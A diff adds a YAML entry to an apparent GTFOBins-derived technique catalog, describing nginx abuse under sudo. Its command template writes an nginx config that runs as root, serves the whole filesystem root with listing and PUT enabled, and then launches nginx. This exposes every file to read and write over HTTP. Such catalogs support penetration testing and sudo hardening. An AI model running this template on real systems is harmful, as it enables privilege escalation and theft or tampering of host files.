@@ -1,0 +1,25 @@
+id: gtfobins/nginx/download/sudo
+type: binary
+platform: linux
+name: nginx
+phases:
+- command-and-control
+- privilege-escalation
+capabilities:
+- file-download
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: "cat >/path/to/temp-file <<EOF\nuser root;\nhttp {\n  server {\n    listen 80;\n    root /;\n\
+    \    autoindex on;\n    dav_methods PUT;\n  }\n}\nevents {}\nEOF\n\nnginx -c /path/to/temp-file"
+references:
+- https://gtfobins.github.io/gtfobins/nginx/
+tags:
+- linux
+- unix
+- gtfobins
